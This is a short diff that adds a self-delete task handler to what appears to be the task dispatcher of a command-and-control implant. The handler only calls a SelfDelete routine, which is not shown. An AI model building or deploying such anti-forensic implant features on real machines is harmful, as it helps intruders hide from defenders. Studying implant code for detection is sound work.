@@ -1375,6 +1375,15 @@ auto DECLFN Task::Process(
     KhRetSuccess;
 }
 
+auto DECLFN Task::SelfDel(
+    _In_ JOBS* Job
+) -> ERROR_CODE {
+    
+     Self->Pkg->Int32( Job->Pkg, Self->Usf->SelfDelete() );
+
+     return KhGetError;
+}
+
 auto DECLFN Task::Exit(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
